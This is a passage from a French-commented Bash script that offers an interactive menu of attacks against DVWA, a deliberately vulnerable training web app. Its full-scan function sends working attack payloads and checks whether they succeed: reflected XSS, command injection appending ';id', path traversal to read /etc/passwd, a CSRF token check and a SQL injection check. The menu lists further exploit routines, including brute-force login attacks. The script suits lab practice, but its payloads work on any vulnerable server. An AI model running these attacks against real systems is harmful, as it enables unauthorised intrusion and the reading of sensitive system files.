    if echo "$sqli_resp" | grep -qiE "admin|gordonb"; then
        echo "✅ SQLi: VULNERABLE" | tee -a "$report"
    else
        echo "❌ SQLi: Protected" | tee -a "$report"
    fi
    
    echo -e "${GREEN}[2/6] Test XSS...${NC}" | tee -a "$report"
    # Test XSS basique
    local xss_resp=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
    if echo "$xss_resp" | grep -qF "<script>alert(1)</script>"; then
        echo "✅ XSS: VULNERABLE" | tee -a "$report"
    else
        echo "❌ XSS: Protected" | tee -a "$report"
    fi
    
    echo -e "${GREEN}[3/6] Test Command Injection...${NC}" | tee -a "$report"
    local cmdinj_resp=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/exec/?ip=127.0.0.1%3Bid&Submit=Submit")
    if echo "$cmdinj_resp" | grep -qE "uid=|www-data"; then
        echo "✅ Command Injection: VULNERABLE" | tee -a "$report"
    else
        echo "❌ Command Injection: Protected" | tee -a "$report"
    fi
    
    echo -e "${GREEN}[4/6] Test File Inclusion...${NC}" | tee -a "$report"
    local lfi_resp=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
    if echo "$lfi_resp" | grep -qE "root:x:0:0"; then
        echo "✅ LFI: VULNERABLE" | tee -a "$report"
    else
        echo "❌ LFI: Protected" | tee -a "$report"
    fi
    
    echo -e "${GREEN}[5/6] Test CSRF...${NC}" | tee -a "$report"
    local csrf_resp=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/csrf/")
    if echo "$csrf_resp" | grep -qv "user_token"; then
        echo "✅ CSRF: VULNERABLE" | tee -a "$report"
    else
        echo "❌ CSRF: Protected" | tee -a "$report"
    fi
    
    echo -e "${GREEN}[6/6] Test File Upload...${NC}" | tee -a "$report"
    echo "⚠️ File Upload: Manual test required" | tee -a "$report"
    
    echo | tee -a "$report"
    echo "========================================" | tee -a "$report"
    echo "Scan terminé - Rapport: $report" | tee -a "$report"
    echo "========================================" | tee -a "$report"
    
    cleanup_cookie_jar "$cookie_jar"
    
    echo
    echo -e "${GREEN}✅ Scan complet terminé${NC}"
    echo -e "${CYAN}📄 Rapport: $report${NC}"
    
    read -p "👉 Entrée..."
}

# ==========================
# MENU PRINCIPAL
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}=== 💣 Exploits DVWA (v3.0 - Robuste) ===${NC}"
        echo
        echo -e "${GREEN}1) 🔓 SQL Injection${NC}       ${YELLOW}[Multi-critères]${NC}"
        echo -e "${GREEN}2) ⚡ XSS Reflected${NC}       ${YELLOW}[7 payloads]${NC}"
        echo -e "${GREEN}3) 💻 Command Injection${NC}   ${YELLOW}[10 variantes]${NC}"
        echo -e "${GREEN}4) 📤 File Upload${NC}         ${YELLOW}[3 techniques]${NC}"
        echo -e "${GREEN}5) 📂 LFI${NC}                 ${YELLOW}[PHP filters]${NC}"
        echo -e "${GREEN}6) 🔀 CSRF${NC}                ${YELLOW}[Token detection]${NC}"
        echo -e "${GREEN}7) 🔐 Brute Force${NC}         ${YELLOW}[Login attack]${NC}"
        echo
        echo -e "${CYAN}8) 🎯 Full Scan${NC}           ${YELLOW}[Toutes vulns]${NC}"
        echo
        echo -e "${MAGENTA}9) 📊 Voir logs${NC}"
        echo -e "${RED}0) ❌ Retour${NC}"
        echo
        read -p "👉 Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            7) exploit_bruteforce ;;
            8) full_scan ;;
            9) 
                clear
                banner
                echo -e "${CYAN}=== 📜 Logs DVWA Exploits ===${NC}\n"
                
                for log in "$LOG_DIR"/*.log; do
                    if [ -f "$log" ]; then
                        echo -e "${GREEN}📄 $(basename "$log")${NC}"
                        tail -n 10 "$log"
                        echo
                    fi
                done
                
                read -p "👉 Entrée..."
                ;;
            0) return ;;
            *)
                echo -e "${RED}❌ Option invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# LANCEMENT
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
